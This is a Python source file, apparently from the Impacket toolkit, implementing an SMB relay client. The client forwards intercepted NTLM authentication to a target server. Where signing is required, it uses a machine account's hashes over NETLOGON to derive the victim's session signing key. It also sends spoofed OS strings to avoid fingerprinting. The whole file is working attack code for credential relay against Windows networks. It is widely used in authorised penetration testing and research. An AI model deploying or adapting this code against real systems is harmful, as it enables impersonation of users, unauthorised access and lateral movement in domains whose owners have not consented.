#!/usr/bin/env python
# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Server
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#  This is the SMB client which initiates the connection to an
# SMB server and relays the credentials to this server.

import logging
from struct import pack, unpack
from binascii import unhexlify, hexlify

from impacket import smb, ntlm
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket.dcerpc.v5 import transport, nrpc
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters

class SMBRelayClient(smb.SMB):
    def __init__(self, remote_name, extended_security = True, sess_port = 445):
        self._extendedSecurity = extended_security
        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None

        smb.SMB.__init__(self,remote_name, remote_name, sess_port = sess_port)

    def neg_session(self):
        neg_sess = smb.SMB.neg_session(self, extended_security = self._extendedSecurity)
        return neg_sess

    def setUid(self,uid):
        self._uid = uid

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp
        if self._SignatureRequired is True:
            if self.domainIp is None:
                logging.error("Signature is REQUIRED on the other end, attack will not work")
            else:
                logging.info("Signature is REQUIRED on the other end, using NETLOGON approach")


    def netlogonSessionKey(self, challenge, authenticateMessageBlob):
        # Here we will use netlogon to get the signing session key
        logging.info("Connecting to %s NETLOGON service" % self.domainIp)

        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
        authenticateMessage = ntlm.NTLMAuthChallengeResponse()
        authenticateMessage.fromString(respToken2['ResponseToken'] )
        _, machineAccount = self.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')

        try:
            av_pairs = authenticateMessage['ntlm'][44:]
            av_pairs = ntlm.AV_PAIRS(av_pairs)

            serverName = av_pairs[ntlm.NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')
        except:
            # We're in NTLMv1, not supported
            return STATUS_ACCESS_DENIED

        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.domainIp

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if len(self.machineHashes) > 0:
            lmhash, nthash = self.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(machineAccount,'', domainName, lmhash, nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', '12345678')

        serverChallenge = resp['ServerChallenge']

        if self.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.machineHashes.split(':')[1])

        sessionKey = nrpc.ComputeSessionKeyStrongKey('', '12345678', serverChallenge, ntHash)

        ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)

        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
                                      ppp, 0x600FFFFF)

        clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)

        # Now let's try to verify the security blob against the PDC

        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4

        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage['user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']

        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 10

        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = '\x00'*8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        #request.dump()
        try:
            resp = dce.request(request)
            #resp.dump()
        except Exception, e:
            #import traceback
            #print traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()

        logging.info("%s\\%s successfully validated through NETLOGON" % (
        domainName, authenticateMessage['user_name'].decode('utf-16le')))

        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != '':
            signingKey = ntlm.generateEncryptedSessionKey(
                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 

        logging.info("SMB Signing key: %s " % hexlify(signingKey))

        self.set_session_key(signingKey)

        self._SignatureEnabled = True
        self._SignSequenceNumber = 2
        self.set_flags(flags1 = SMB.FLAGS1_PATHCASELESS, flags2 = SMB.FLAGS2_EXTENDED_SECURITY)
        return STATUS_SUCCESS

    def sendNegotiate(self, negotiateMessage):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
          

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit() 

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
        smb = self.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            logging.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            self._uid = smb['Uid']

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            return respToken['ResponseToken']

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY 
        # Are we required to sign SMB? If so we do it, if not we skip it
        if self._SignatureRequired: 
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = self._uid

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
        sessionSetup['Data']['SecurityBlob'] = str(authenticateMessageBlob)
        smb.addCommand(sessionSetup)
        self.sendSMB(smb)
            
        smb = self.recvSMB()
        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        if errorCode == STATUS_SUCCESS and self._SignatureRequired is True and self.domainIp is not None:
            try:
                errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)    
            except:
                #import traceback
                #print traceback.print_exc()
                raise

        return smb, errorCode
